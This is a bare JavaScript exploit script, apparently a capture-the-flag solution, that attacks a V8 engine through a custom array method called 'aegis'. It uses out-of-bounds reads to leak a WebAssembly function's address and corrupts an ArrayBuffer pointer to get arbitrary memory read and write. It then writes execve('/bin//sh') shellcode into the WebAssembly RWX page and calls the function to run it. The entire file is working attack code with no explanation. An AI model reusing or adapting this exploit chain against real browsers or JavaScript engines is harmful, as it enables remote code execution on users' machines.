function gc() { for (let i = 0; i < 0x10; i++) { new ArrayBuffer(0x1000000); } }


var f64 = new Float64Array(1);
var u32 = new Uint32Array(f64.buffer);


function d2u(v) {
    f64[0] = v;
    return u32;
}


function u2d(lo, hi) {
    u32[0] = lo;
    u32[1] = hi;
    return f64[0];
}


function hex(lo, hi) {
    if( lo == 0 ) {
        return ("0x" + hi.toString(16) + "-00000000");
    }
    if( hi == 0 ) {
        return ("0x" + lo.toString(16));
    }
    return ("0x" + hi.toString(16) + "-" + lo.toString(16));
}


let wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 7, 1, 96, 2, 127, 127, 1, 127, 3, 2, 1, 0, 4, 4, 1, 112, 0, 0, 5, 3, 1, 0, 1, 7, 21, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 8, 95, 90, 51, 97, 100, 100, 105, 105, 0, 0, 10, 9, 1, 7, 0, 32, 1, 32, 0, 106, 11]);
let wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), {});
let f = wasm_mod.exports._Z3addii;




function pwn () {


    let arr = [0x1234, 0x1338, 3.3];
    let leaked_array = [u2d(0xdada, 0xdada,), f, f, f];
    let ab = new ArrayBuffer(0x1338);


    arr.aegis(6, 0x1000);
    arr.aegis(8, 0x1000);


    for(let i = 0; i < 100; i++) {
        tmp = d2u(arr[i]);
        console.log(i + " : " + hex(tmp[0], tmp[1]));
    }


    // 28 -> wasm function addr
    let wasm_addr = d2u(arr[28]);


    // 37 -> arbitrary read/write
    arr[37] = u2d(wasm_addr[0] - 1, wasm_addr[1]);
    let dv = new DataView(ab);
    lo = dv.getUint32(0x18, true);
    hi = dv.getUint32(0x18 + 4, true);


    console.log(hex(lo, hi));
    arr[37] = u2d(lo - 1 - 0x120, hi);
    rwx_lo = dv.getUint32(0, true);
    rwx_hi = dv.getUint32(4, true);


    console.log(hex(rwx_lo, rwx_hi));


    var shellcode = new Uint32Array([0x90909090, 0x90909090, 0x4852e6f7, 0x69622fbb, 0x732f2f6e,
        0x8d485368, 0x3bb0243c, 0x90d23148, 0x90905152, 0x24348d48,
        0x9090050f, 0x90188948]);                      

    arr[37] = u2d(rwx_lo, rwx_hi);
    for (let i = 0; i < shellcode.length; i++) {
        dv.setUint32(4 * i, shellcode[i], true);
    }


    f();
}


pwn();
